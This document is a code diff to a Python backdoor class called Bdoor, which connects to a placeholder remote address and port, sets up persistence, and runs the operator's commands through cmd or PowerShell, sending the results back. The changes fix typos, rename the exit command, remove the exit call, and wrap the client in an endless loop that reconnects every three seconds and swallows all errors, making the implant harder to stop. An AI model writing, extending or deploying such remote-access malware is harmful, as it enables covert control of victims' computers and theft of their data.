@@ -9,6 +9,7 @@ import json
 import shutil
 import subprocess
 import base64
+import time
 import sys
 import os
 
@@ -18,7 +19,7 @@ class Bdoor:
     cli_p = {"cmd": "cmd",
              "PS": "powershell", 
              "powershell": "powershell", 
-             "default": "dafault"}
+             "default": "default"}
 
     def __init__(self, addr, prt):
         self.pers__()
@@ -85,7 +86,7 @@ class Bdoor:
             try:
                 if comm == None:
                     self.exec_cmd("")
-                elif "exit" in comm[0]:
+                elif "exitc" in comm[0]:
                     self.con_close()
                 elif comm[0] == "cd" and len(comm) > 1 and not comm[1] == "/?":
                     self.cd_to(comm[1])
@@ -98,7 +99,8 @@ class Bdoor:
                     self.cli = self.cli_p[comm[1]]
                     self.send_data("CLI preferred: " + self.cli)
                 elif comm[0] == "getcli":
-                    self.send_data("CLI preferred: " + self.cli)
+                    self.send_data("CLI preferred: " + (self.cli if self.cli != "default" else self.cli + \
+                        "\n\rDepend on OS settings. It might be cmd or PowerShell\n"))
                 else:
                     self.exec_cmd(comm)
             except (TimeoutError, ConnectionRefusedError, ConnectionAbortedError, BrokenPipeError, ConnectionError):
@@ -112,7 +114,12 @@ class Bdoor:
     def con_close(self):
         self.conn.close()
         # exiting with sys makes to not to pop a message windows up.
-        sys.exit()
+        # sys.exit()
 
-my_bd = Bdoor("<ip>", <prt>)
-my_bd.run()
+while True:
+    try:
+        my_bd = Bdoor("<ip>", <prt>)
+        my_bd.run()
+    except(ConnectionRefusedError, ConnectionAbortedError, ConnectionError, Exception, OSError):
+        pass
+    time.sleep(3)
